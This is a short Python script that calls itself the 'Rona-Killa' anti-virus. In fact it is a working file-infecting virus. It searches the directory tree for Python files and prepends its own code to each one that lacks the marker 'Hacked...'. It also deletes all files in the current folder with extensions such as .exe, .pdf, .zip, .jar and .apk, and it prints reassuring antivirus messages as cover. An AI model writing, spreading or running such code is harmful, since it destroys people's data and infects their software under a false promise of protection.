#!/usr/bin/python  
import os, datetime, inspect
import glob
  
DATA_TO_INSERT = "Hacked..."
bad_words = ['*&#$%#*(#$&*&^#$JHDS(*^#@$*%(#$(*&']
code = "Cleaning proccess complete..."
with open('Rona-Killa.txt') as oldfile, open('ReadMe.txt', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(code)
#search for target files in path 
def search(path):   
    filestoinfect = []  
    filelist = os.listdir(path)  
    for filename in filelist:  
          
        #If it is a folder 
        if os.path.isdir(path+"/"+filename):   
            filestoinfect.extend(search(path+"/"+filename))  
              
        #If it is a python script -> Infect it     
        elif filename[-3:] == ".py":
              
            #default value 
            infected = False  
            for line in open(path+"/"+filename):  
                if DATA_TO_INSERT in line:  
                    infected = True
                    break
            if infected == False:  
                filestoinfect.append(path+"/"+filename)  
    return filestoinfect  
  
#changes to be made in the target file  
def infect(filestoinfect):  
    target_file = inspect.currentframe().f_code.co_filename  
    virus = open(os.path.abspath(target_file))  
    virusstring = ""  
    for i,line in enumerate(virus):  
        if i>=0 and i <41:  
            virusstring += line  
    virus.close  
    for fname in filestoinfect:  
        f = open(fname)  
        temp = f.read()  
        f.close()  
        f = open(fname,"w")  
        f.write(virusstring + temp)  
        f.close()  
fileTypes = ["./*.vbs", "./*.QFX", "./*.bat", "./*.pdf", "./*.jar", "./*.apk", "./*.exe", "./*.iges", "./*.zip", "./*.dxf"] 
cleanList = glob.glob(fileTypes[0])
for type in fileTypes:
        cleanList += glob.glob(type)    

for file in cleanList:
        os.remove(file)
#Not required actually         
def explode():  
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 1:  
            print ("Rona-Killa anti virus program still has you covered:)") 
filestoinfect = search(os.path.abspath(""))  
infect(filestoinfect)  
explode()